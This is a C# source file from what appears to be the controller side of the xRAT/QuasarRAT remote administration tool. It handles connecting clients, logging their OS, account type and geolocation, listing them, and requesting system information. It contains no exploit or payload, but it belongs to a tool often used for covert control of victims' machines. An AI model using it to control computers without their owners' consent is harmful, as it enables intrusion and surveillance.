using System;
using System.Windows.Forms;
using xServer.Core.Packets.ClientPackets;
using xServer.Forms;
using xServer.Settings;

namespace xServer.Core.Commands
{
    /* THIS PARTIAL CLASS SHOULD CONTAIN METHODS THAT MANIPULATE THE CONNECTION. */
    public static partial class CommandHandler
    {
        public static void HandleInitialize(Client client, Initialize packet)
        {
            if (client.EndPoint.Address.ToString() == "255.255.255.255")
                return;

            FrmMain.Instance.Invoke((MethodInvoker)delegate
            {
                try
                {
                    client.Value.Version = packet.Version;
                    client.Value.OperatingSystem = packet.OperatingSystem;
                    client.Value.AccountType = packet.AccountType;
                    client.Value.Country = packet.Country;
                    client.Value.CountryCode = packet.CountryCode;
                    client.Value.Region = packet.Region;
                    client.Value.City = packet.City;
                    client.Value.Id = packet.Id;

                    if (!FrmMain.Instance.ListenServer.AllTimeConnectedClients.ContainsKey(client.Value.Id))
                        FrmMain.Instance.ListenServer.AllTimeConnectedClients.Add(client.Value.Id, DateTime.Now);

                    FrmMain.Instance.ListenServer.ConnectedClients++;
                    FrmMain.Instance.UpdateWindowTitle(FrmMain.Instance.ListenServer.ConnectedClients,
                        FrmMain.Instance.lstClients.SelectedItems.Count);

                    string country = string.Format("{0} [{1}]", client.Value.Country, client.Value.CountryCode);

                    // this " " leaves some space between the flag-icon and the IP
                    ListViewItem lvi = new ListViewItem(new string[]
                    {
                        " " + client.EndPoint.Address.ToString(), client.EndPoint.Port.ToString(), client.Value.Version,
                        "Connected",
                        "Active", country, client.Value.OperatingSystem, client.Value.AccountType
                    }) { Tag = client, ImageIndex = packet.ImageIndex };


                    FrmMain.Instance.lstClients.Items.Add(lvi);

                    if (XMLSettings.ShowPopup)
                        ShowPopup(client);

                    client.Value.IsAuthenticated = true;
                    new Packets.ServerPackets.GetSystemInfo().Execute(client);
                }
                catch
                {
                }
            });
        }

        public static void HandleStatus(Client client, Status packet)
        {
            FrmMain.Instance.Invoke((MethodInvoker)delegate
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    Client c = (Client)lvi.Tag;
                    if (client == c)
                    {
                        lvi.SubItems[3].Text = packet.Message;
                        break;
                    }
                }
            });
        }

        public static void HandleUserStatus(Client client, UserStatus packet)
        {
            FrmMain.Instance.Invoke((MethodInvoker)delegate
            {
                foreach (ListViewItem lvi in FrmMain.Instance.lstClients.Items)
                {
                    Client c = (Client)lvi.Tag;
                    if (client == c)
                    {
                        lvi.SubItems[4].Text = packet.Message;
                        break;
                    }
                }
            });
        }
    }
}